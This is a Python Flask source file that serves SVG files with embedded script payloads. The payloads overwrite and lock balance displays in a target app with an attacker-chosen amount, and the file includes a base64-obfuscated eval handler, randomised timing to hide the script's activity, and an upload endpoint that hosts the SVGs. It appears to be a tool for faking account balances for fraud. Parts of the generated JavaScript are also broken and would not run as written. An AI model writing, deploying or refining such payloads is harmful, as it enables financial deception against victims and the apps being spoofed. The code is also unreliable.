from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import uuid
import os
import random

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = '/tmp/uploads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Enable CORS
CORS(app)

def generate_enhanced_payload(device_id, target_app, target_amount):
    selectors = [
        '.balance', '[data-testid="balance"]', '#balance', 
        '.account-balance', '[class*="balance"]'
    ]
    
    js_payload = f"""
    function overrideBalance() {{
        {";".join([
            f"Array.from(document.querySelectorAll('{sel}')).forEach(el => el.innerText = '{target_amount}');"
            for sel in selectors
        ])}
        
        Object.defineProperty(document, 'querySelectorAll', {{
            value: function(selector) {{
                const elements = Array.prototype.call(this, selector);
                if (selectors.some(s => selector.includes(s))) {{
                    elements.forEach(el => {{
                        Object.defineProperty(el, 'innerText', {{
                            get: () => '{target_amount}',
                            set: () => {{}}
                        }});
                    }});
                }}
                return elements;
            }}
        }});
    }}
    
    setInterval(overrideBalance, 500);
    window.addEventListener('load', overrideBalance);
    """
    
    return f"""<svg xmlns="http://www.w3.org/2000/svg">
        <script>{js_payload}</script>
        <rect x="0" y="0" width="1" height="1" 
              onmouseover="eval(atob('ZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmJhbGFuY2UnKS5pbm5lckhUTUw9JzEwMDAwMDAn'))"/>
    </svg>"""

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/generate', methods=['POST'])
def generate():
    device_id = request.json.get('device_id')
    target_app = request.json.get('target_app')
    target_amount = request.json.get('target_amount')
    
    payload = generate_enhanced_payload(device_id, target_app, target_amount)
    delay = random.randint(1000, 5000)
    payload = payload.replace('setInterval(', f'setTimeout(() => setInterval(')
    payload = payload.replace('), 500)', f'), {delay})')
    
    return jsonify({'payload': payload})

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return jsonify({'error': 'No file uploaded'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400
    
    filename = f"{uuid.uuid4()}.svg"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    
    return jsonify({'url': f"{request.url_root}uploads/{filename}"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
